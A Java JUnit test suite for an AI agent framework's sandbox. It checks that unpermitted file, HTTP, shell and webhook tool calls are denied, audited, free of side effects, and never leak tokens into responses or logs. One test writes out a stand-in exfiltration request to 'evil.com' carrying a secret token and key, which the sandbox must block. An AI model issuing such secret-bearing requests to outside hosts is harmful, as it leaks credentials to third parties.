package io.oryxos.tool;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import ch.qos.logback.classic.Level;
import ch.qos.logback.classic.Logger;
import ch.qos.logback.classic.spi.ILoggingEvent;
import ch.qos.logback.core.read.ListAppender;
import com.sun.net.httpserver.HttpServer;
import io.oryxos.core.agent.ToolAction;
import io.oryxos.core.agent.ToolCallEvent;
import io.oryxos.core.agent.ToolOutput;
import io.oryxos.core.profile.AgentProfile;
import io.oryxos.core.tool.ToolRegistry;
import io.oryxos.tool.notify.NotifyTool;
import io.oryxos.tool.notify.WebhookNotifyAdapter;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.http.HttpClient;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.atomic.AtomicInteger;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.slf4j.LoggerFactory;

/**
 * Whole path: tool call -> RegistryToolExecutor -> real tool -> ProfileSandbox, with the audit
 * decorator on top. A denied call must (1) be reported as denied, (2) leave a success=false
 * SandboxDenied audit row, and (3) cause no side effect at all.
 */
class SandboxEnforcementTest {
  private static final String TOKEN = "TOKEN-ABC123";
  private static final String KEY = "SECRETKEY";
  @TempDir Path temp;

  private final AtomicInteger apiHits = new AtomicInteger();
  private final AtomicInteger hookHits = new AtomicInteger();
  private final AtomicInteger redirectTargetHits = new AtomicInteger();
  private final AtomicInteger launches = new AtomicInteger();
  private final List<ToolCallEvent> audit = new ArrayList<>();
  private final ListAppender<ILoggingEvent> logs = new ListAppender<>();
  private HttpServer server;
  private int port;
  private AuditedToolExecutor executor;
  private Path workspace;

  @BeforeEach
  void setUp() throws IOException {
    workspace = Files.createDirectories(temp.resolve("ws"));
    server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
    server.createContext("/api", ex -> reply(ex, apiHits, 200));
    server.createContext("/hook", ex -> reply(ex, hookHits, 200));
    server.createContext("/target", ex -> reply(ex, redirectTargetHits, 200));
    server.createContext(
        "/go",
        ex -> {
          ex.getResponseHeaders().add("Location", "http://127.0.0.1:" + port + "/target");
          ex.sendResponseHeaders(302, -1);
          ex.close();
        });
    server.start();
    port = server.getAddress().getPort();

    // Operator ceiling: everything below is *available*; a Profile still has to ask for it.
    var ceiling =
        new SandboxPolicy(
            List.of(workspace), List.of(workspace), Set.of("date"), Set.of("127.0.0.1"));
    var sandbox = new ProfileSandbox(ceiling);
    HttpClient http = HttpGetTool.defaultClient();
    var shell =
        new ShellTool(
            sandbox,
            Duration.ofSeconds(5),
            b -> {
              launches.incrementAndGet();
              throw new IOException("launch intercepted");
            });
    var registry =
        new ToolRegistry(
            List.of(
                new FileReadTool(sandbox),
                new FileWriteTool(sandbox),
                new HttpGetTool(sandbox, http),
                shell,
                new NotifyTool(List.of(new WebhookNotifyAdapter(http)), sandbox)));
    executor = new AuditedToolExecutor(new RegistryToolExecutor(registry), audit::add);

    logs.start();
    ((Logger) LoggerFactory.getLogger(Logger.ROOT_LOGGER_NAME)).addAppender(logs);
    ((Logger) LoggerFactory.getLogger(Logger.ROOT_LOGGER_NAME)).setLevel(Level.DEBUG);
  }

  @AfterEach
  void tearDown() {
    server.stop(0);
    ((Logger) LoggerFactory.getLogger(Logger.ROOT_LOGGER_NAME)).detachAppender(logs);
    logs.stop();
  }

  private static void reply(com.sun.net.httpserver.HttpExchange ex, AtomicInteger hits, int status)
      throws IOException {
    hits.incrementAndGet();
    ex.getRequestBody().readAllBytes();
    ex.sendResponseHeaders(status, -1);
    ex.close();
  }

  private static final List<String> ALL_TOOLS =
      List.of("file_read", "file_write", "http_get", "shell_exec", "notify");

  /** A Profile that may call every tool but declares NO sandbox permissions. */
  private AgentProfile unsandboxed() {
    return TestProfiles.with("silent", ALL_TOOLS, null, List.of(hook()));
  }

  private Map<String, Object> hook() {
    return Map.of(
        "name",
        "ops",
        "type",
        "webhook",
        "url",
        "http://127.0.0.1:" + port + "/hook/" + TOKEN + "?key=" + KEY);
  }

  private ToolOutput call(AgentProfile profile, String id, String tool, String json) {
    return executor.execute("sess-" + id, profile, new ToolAction(id, tool, json));
  }

  private String json(String... kv) {
    var node = new com.fasterxml.jackson.databind.ObjectMapper().createObjectNode();
    for (int i = 0; i < kv.length; i += 2) {
      node.put(kv[i], kv[i + 1]);
    }
    return node.toString();
  }

  // ----------------------------------------------------------- no side effects

  @Test
  void everySandboxedToolDeniesAProfileWithoutPermissionAndCausesNoSideEffect() {
    AgentProfile p = unsandboxed();
    Path target = workspace.resolve("created.txt");

    ToolOutput write = call(p, "1", "file_write", json("path", target.toString(), "content", "x"));
    ToolOutput read = call(p, "2", "file_read", json("path", workspace.resolve("any").toString()));
    ToolOutput http = call(p, "3", "http_get", json("url", "http://127.0.0.1:" + port + "/api"));
    ToolOutput shell = call(p, "4", "shell_exec", json("command", "date"));
    ToolOutput notify = call(p, "5", "notify", json("target", "ops", "message", "hello"));

    for (ToolOutput out : List.of(write, read, http, shell, notify)) {
      assertTrue(out.isDenied(), out.errorMessage());
      assertFalse(out.success());
    }
    assertFalse(Files.exists(target), "denied file_write must not create the file");
    assertEquals(0, apiHits.get(), "denied http_get must not send a request");
    assertEquals(0, hookHits.get(), "denied notify must not send a request");
    assertEquals(0, launches.get(), "denied shell_exec must not start a process");
  }

  @Test
  void everyDeniedCallLeavesAFailedSandboxDeniedAuditRowWithSessionAndTool() {
    AgentProfile p = unsandboxed();
    call(p, "1", "file_write", json("path", workspace.resolve("a").toString(), "content", "x"));
    call(p, "2", "file_read", json("path", workspace.resolve("a").toString()));
    call(p, "3", "http_get", json("url", "http://127.0.0.1:" + port + "/api"));
    call(p, "4", "shell_exec", json("command", "date"));
    call(p, "5", "notify", json("target", "ops", "message", "hello"));

    assertEquals(5, audit.size());
    List<String> tools = List.of("file_write", "file_read", "http_get", "shell_exec", "notify");
    for (int i = 0; i < 5; i++) {
      ToolCallEvent event = audit.get(i);
      assertEquals("sess-" + (i + 1), event.sessionId());
      assertEquals(tools.get(i), event.toolName());
      assertFalse(event.success());
      assertEquals("SandboxDenied", event.errorCategory());
    }
  }

  @Test
  void thePermissionCheckHappensBeforeTheActionNotAfterIt() throws IOException {
    // A profile allowed to write only under ws/mine: writing elsewhere must not even create dirs.
    Path mine = Files.createDirectories(workspace.resolve("mine"));
    AgentProfile p =
        TestProfiles.with(
            "writer", ALL_TOOLS, Map.of("write_roots", List.of(mine.toString())), List.of());
    ToolOutput ok =
        call(
            p, "1", "file_write", json("path", mine.resolve("ok.txt").toString(), "content", "hi"));
    ToolOutput bad =
        call(
            p,
            "2",
            "file_write",
            json("path", workspace.resolve("other.txt").toString(), "content", "no"));
    assertTrue(ok.success(), ok.errorMessage());
    assertTrue(bad.isDenied());
    assertEquals("hi", Files.readString(mine.resolve("ok.txt")));
    assertFalse(Files.exists(workspace.resolve("other.txt")));
    assertEquals("SandboxDenied", audit.get(1).errorCategory());
    assertTrue(audit.get(0).success());
  }

  @Test
  void aPermittedCallStillWorksEndToEnd() {
    AgentProfile p =
        TestProfiles.with("web", ALL_TOOLS, Map.of("hosts", List.of("127.0.0.1")), List.of(hook()));
    assertTrue(
        call(p, "1", "http_get", json("url", "http://127.0.0.1:" + port + "/api")).success());
    assertTrue(call(p, "2", "notify", json("target", "ops", "message", "hi")).success());
    assertEquals(1, apiHits.get());
    assertEquals(1, hookHits.get());
    assertTrue(audit.stream().allMatch(ToolCallEvent::success));
  }

  // ---------------------------------------------------------------- redirects

  @Test
  void aRedirectIsNeverFollowedSoItCannotLeaveTheApprovedTarget() {
    AgentProfile p =
        TestProfiles.with("web", ALL_TOOLS, Map.of("hosts", List.of("127.0.0.1")), List.of());
    ToolOutput out = call(p, "1", "http_get", json("url", "http://127.0.0.1:" + port + "/go"));
    assertFalse(out.success());
    assertTrue(out.errorMessage().contains("302"));
    assertEquals(0, redirectTargetHits.get(), "the Location target must never be requested");
  }

  @Test
  void anHttpClientThatFollowsRedirectsIsRefusedAtConstruction() {
    HttpClient following =
        HttpClient.newBuilder().followRedirects(HttpClient.Redirect.ALWAYS).build();
    var sandbox = new ProfileSandbox(SandboxPolicy.denyAll());
    assertThrows(IllegalArgumentException.class, () -> new HttpGetTool(sandbox, following));
    assertThrows(IllegalArgumentException.class, () -> new WebhookNotifyAdapter(following));
  }

  // ------------------------------------------------------------------ secrets

  private void assertNoSecretAnywhere(ToolOutput out) {
    String everything = out.content() + out.errorMessage();
    assertFalse(
        everything.contains(TOKEN) || everything.contains(KEY), "response leaked: " + everything);
    for (ILoggingEvent event : logs.list) {
      String text = event.getFormattedMessage();
      if (event.getThrowableProxy() != null) {
        text += event.getThrowableProxy().getMessage();
      }
      assertFalse(text.contains(TOKEN) || text.contains(KEY), "log leaked: " + text);
    }
  }

  @Test
  void aWebhookTokenNeverAppearsInResponsesOrLogsWhenTheCallIsDenied() {
    ToolOutput out = call(unsandboxed(), "1", "notify", json("target", "ops", "message", "hello"));
    assertTrue(out.isDenied());
    assertNoSecretAnywhere(out);
  }

  @Test
  void aWebhookTokenNeverAppearsWhenDeliveryFails() {
    AgentProfile p =
        TestProfiles.with("web", ALL_TOOLS, Map.of("hosts", List.of("127.0.0.1")), List.of(hook()));
    server.stop(0); // connection refused
    ToolOutput refused = call(p, "1", "notify", json("target", "ops", "message", "hello"));
    assertFalse(refused.success());
    assertNoSecretAnywhere(refused);
  }

  @Test
  void aMalformedWebhookUrlIsReportedWithoutEchoingIt() {
    Map<String, Object> broken =
        Map.of(
            "name",
            "ops",
            "type",
            "webhook",
            "url",
            "http://exa mple.com/" + TOKEN + "?key=" + KEY);
    AgentProfile p =
        TestProfiles.with("web", ALL_TOOLS, Map.of("hosts", List.of("127.0.0.1")), List.of(broken));
    ToolOutput out = call(p, "1", "notify", json("target", "ops", "message", "hello"));
    assertFalse(out.success());
    assertNoSecretAnywhere(out);
  }

  @Test
  void anUnparseableOrOffListHttpGetUrlIsNotEchoedBack() {
    AgentProfile p =
        TestProfiles.with("web", ALL_TOOLS, Map.of("hosts", List.of("127.0.0.1")), List.of());
    ToolOutput malformed =
        call(p, "1", "http_get", json("url", "http://bad host/" + TOKEN + "?key=" + KEY));
    ToolOutput offList =
        call(p, "2", "http_get", json("url", "https://evil.com/" + TOKEN + "?key=" + KEY));
    assertFalse(malformed.success());
    assertTrue(offList.isDenied());
    assertNoSecretAnywhere(malformed);
    assertNoSecretAnywhere(offList);
  }

  @Test
  void aFilePathIsNotEchoedWhenThePlatformCannotParseIt() {
    AgentProfile p =
        TestProfiles.with(
            "files", ALL_TOOLS, Map.of("read_roots", List.of(workspace.toString())), List.of());
    ToolOutput out = call(p, "1", "file_read", json("path", workspace + "/" + TOKEN + ":stream"));
    assertFalse(out.success());
    assertNoSecretAnywhere(out);
  }

  @Test
  void anUnexpectedToolBugIsLoggedWithoutItsMessageWhichMayHoldASecret() {
    var leaky =
        new io.oryxos.core.tool.OryxTool() {
          public String getName() {
            return "leaky";
          }

          public String getDescription() {
            return "throws with a secret in the message";
          }

          public String getInputSchema() {
            return "{}";
          }

          public ToolOutput execute(String args, io.oryxos.core.tool.ToolContext ctx) {
            throw new IllegalStateException(
                "connect failed for https://h/" + TOKEN + "?key=" + KEY);
          }
        };
    var executor = new RegistryToolExecutor(new ToolRegistry(List.of(leaky)));
    AgentProfile p = TestProfiles.with("p", List.of("leaky"), null, List.of());
    ToolOutput out = executor.execute("s", p, new ToolAction("1", "leaky", "{}"));

    assertFalse(out.success());
    assertTrue(
        logs.list.stream().anyMatch(e -> e.getFormattedMessage().contains("leaky")),
        "the failure itself must be logged, otherwise this test proves nothing");
    assertNoSecretAnywhere(out);
  }
}
